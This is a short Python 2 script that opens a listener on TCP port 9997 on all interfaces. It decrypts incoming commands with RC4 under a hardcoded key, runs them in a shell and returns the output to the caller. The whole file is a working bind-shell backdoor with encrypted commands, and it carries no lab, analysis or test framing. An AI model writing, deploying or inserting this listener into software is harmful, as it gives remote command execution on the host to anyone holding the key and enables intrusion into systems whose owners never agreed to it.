#!/usr/bin/python2
import socket
import subprocess

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.bind(('', 9997))
sock.listen(5)

KEY = "\xd5\x0c\xb5\x2b\xca\x1d\x2b\x45"

# http://code.activestate.com/recipes/576736-rc4-arc4-arcfour-algorithm/
def rc4crypt(data, key):
    x = 0
    box = range(256)
    for i in range(256):
        x = (x + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[x] = box[x], box[i]
    x = 0
    y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
    return ''.join(out)

while True :
    client, addr = sock.accept()
    print 'connection from ', addr
    client.settimeout(3)
    command = client.recv(32)

    decrypted = rc4crypt(command, KEY)
    print decrypted
    proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE)
    proc.wait()
    stdout, stderr = proc.communicate()
    client.sendall(stdout)
    client.close()
